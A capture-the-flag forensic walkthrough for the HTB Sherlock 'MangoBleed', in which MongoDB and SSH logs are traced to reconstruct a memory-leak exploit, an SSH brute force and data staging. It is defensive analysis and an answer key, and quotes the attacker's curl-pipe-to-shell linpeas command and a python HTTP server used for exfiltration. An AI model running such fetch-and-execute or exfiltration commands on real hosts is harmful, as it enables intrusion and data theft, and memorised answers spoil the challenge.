# MANGOBLEED - HTB Sherlock Walkthrough

| Field | Value |
|---|---|
| Category | DFIR - Linux/MongoDB incident triage |
| Difficulty | Very Easy |
| Artifacts provided | UAC (Unix-like Artifacts Collector) full triage bundle - `mongod.log`, `auth.log`, `.bash_history`, package manifests, live-response snapshots |
| Scenario | A secondary MongoDB server (`mongodbsync`) is remotely exploited via an unauthenticated memory-disclosure bug ("MongoBleed"), leaked credentials are used to brute-force SSH, and the attacker pivots to privesc recon and data staging for exfiltration |
| Host | `ip-172-31-38-170` (mongod log identifies itself as `mongodbsync`) |

---

## Artifact Notes

Same password/encryption scheme as other Sherlocks (`7z x -phacktheblue MangoBleed.zip`). This one ships a full [UAC](https://github.com/tclahr/uac) triage collection rather than two flat log files - `uac-mongodbsync-linux-triage/[root]/...` mirrors the live filesystem, plus `live_response/` snapshots (processes, network, packages) and a `bodyfile` for timeline work. Only the pieces needed to answer the tasks are covered below; no scripts referenced in attacker history (e.g. `linpeas.sh`) were downloaded or executed as part of this analysis - static log/history review only.

---

## Q1 - CVE ID for the MongoDB vulnerability ("MongoBleed")

Not present in the artifacts themselves - this is public vulnerability research. MongoDB disclosed "MongoBleed" on 2025-12-19: an unauthenticated remote memory-read caused by improper length handling when decompressing zlib-compressed wire protocol messages, letting an attacker coerce the server into returning uninitialized heap memory (credentials, tokens, etc.) in its response. CVSS 8.7. Public PoC landed 2025-12-26; in-the-wild exploitation confirmed 2025-12-29 - which lines up exactly with this host's log dates below.

**Answer: `CVE-2025-14847`**

---

## Q2 - MongoDB version installed

```
$ grep -i buildinfo mongod.log | head -1
{"t":{"$date":"2025-12-29T05:11:47.713+00:00"}, ... "msg":"Build Info",
 "attr":{"buildInfo":{"version":"8.0.16", ...}}}
```

Confirmed against the package manifest (`mongodb-org-server 8.0.16`).

**Answer: `8.0.16`**

---

## Q3 - Attacker IP used to exploit the CVE

`mongod.log` contains exactly one remote address across every `Connection accepted` (event 22943) / `Connection ended` (event 22944) pair in the entire capture:

```
$ grep '"id":22943' mongod.log | grep -oE '"remote":"[0-9.]+' | sort -u
"remote":"65.0.76.43
```

**Answer: `65.0.76.43`**

---

## Q4 - Earliest confirmed malicious event

First `Connection accepted` from the attacker IP:

```
{"t":{"$date":"2025-12-29T05:25:52.743+00:00"}, "id":22943, "msg":"Connection accepted",
 "attr":{"remote":"65.0.76.43:35340", ..., "connectionId":1, "connectionCount":1}}
```

mongod itself came up at 05:11:47 (normal boot, `connectionId:1` confirms this is the very first client connection the server ever accepted) - the exploitation window starts 14 minutes later.

**Answer: `2025-12-29 05:25:52 UTC`**

---

## Q5 - Total malicious connections

```
$ grep -c '"id":22943' mongod.log   # Connection accepted
37630
$ grep -c '"id":22944' mongod.log   # Connection ended
37630
```

Every `connectionId` that appears in an accepted event also appears in an ended event (verified as an exact set match, not just equal counts) - a clean 1:1 pairing across all 37,630 distinct TCP connections, all from `65.0.76.43`, compressed into roughly 75 seconds (05:25:52.743 -> 05:27:07.159, `connectionId` range 1-37630, which is also the highest `connectionId` in the entire log - no further mongod connections occur later during the SSH/privesc phase).

The task hint flags that the public [mongobleed-detector](https://github.com/Neo23x0/mongobleed-detector) script only tallies `Connection accepted` (22943) events and explicitly says to also factor in the `Connection ended` (22944) events - i.e. the expected count is accepted + ended combined, not the deduplicated connection total:

```
37630 (accepted) + 37630 (ended) = 75260
```

That volume/rate fits the exploit's mechanics: MongoBleed needs many repeated malformed-zlib requests to leak enough heap memory to reconstruct usable secrets.

**Answer: `75260`**

---

## Q6 - Timestamp of interactive hands-on SSH access

The leaked memory evidently contained credentials for a `mongoadmin` account, which the attacker brute-forced immediately after the exploitation burst finished:

```
05:39:18 - 05:39:24   dozens of "authentication failure" / keyboard-interactive attempts
                       for mongoadmin from 65.0.76.43 (automated credential-spray)
05:39:24.276  Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 ssh2
05:39:24.861  session closed for user mongoadmin        <- confirmation connect, same second
05:40:03.475  Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 ssh2
05:40:03.486  New session 10 of user mongoadmin.
   ...
05:48:28.250  Disconnected from user mongoadmin 65.0.76.43 port 46062
05:48:28.250  session closed for user mongoadmin
```

Same pattern as other Sherlocks in this series: the first `Accepted` is the brute-force tool validating a working credential (opens/closes instantly), the second is the human attacker's real terminal session - active for ~8m25s, matching the task hint.

**Answer: `2025-12-29 05:40:03 UTC`**

---

## Q7 - In-memory privilege-escalation script execution

`mongoadmin`'s `.bash_history`:

```
ls -la
whoami
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
cd /data
...
```

Classic curl-pipe-to-shell pattern - `linpeas.sh` (PEASS-ng's Linux privilege-escalation enumeration script) is streamed straight into `sh` and never touches disk as a standalone file, i.e. executed entirely in memory.

**Answer: `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`**

---

## Q8 - Exfiltration staging directory

Continuing the same history, after the linpeas run and a failed `sudo` attempt (`1 incorrect password attempt`), the attacker pokes around `/data` and `/var/lib/mongodb/`, installs `zip`, then returns into the Mongo data directory and stands up a bare HTTP server there:

```
cd /var/lib/mongodb/
ls -la
cd ../
which zip
apt install zip
zip
cd mongodb/          # back into /var/lib/mongodb/
python3
python3 -m http.server 6969
exit
```

`python3 -m http.server 6969` is launched from inside `/var/lib/mongodb` - the on-disk BSON/WiredTiger data directory - consistent with staging the raw database files (likely zipped first) for pull-based exfiltration over the exposed port.

**Answer: `/var/lib/mongodb`**

---

## Attack Chain Summary

```
CVE-2025-14847 "MongoBleed" unauthenticated zlib memory-disclosure exploit
  -> 37,630 malformed connections from 65.0.76.43 in ~75s (05:25:52-05:27:07)
     [75,260 accepted+ended log events per task counting convention, see Q5]
  -> heap memory leak yields mongoadmin OS credentials
  -> automated SSH credential validation (05:39:18-05:39:24)
  -> real interactive SSH session, ~8m25s (05:40:03-05:48:28)
      -> curl | sh linpeas.sh                          [in-memory privesc recon]
      -> sudo attempt fails (no valid password)
      -> recon of /data and /var/lib/mongodb
      -> zip installed
      -> python3 -m http.server 6969 inside /var/lib/mongodb  [exfil staging]
```

## Tooling notes

`mongod.log` is structured JSON-per-line (MongoDB's default log format since 4.4+), which made this far easier than free-text log parsing - `grep -c '"id":<event>'` plus a `connectionId` set-diff was enough to get an exact, auditable connection count instead of an approximation.
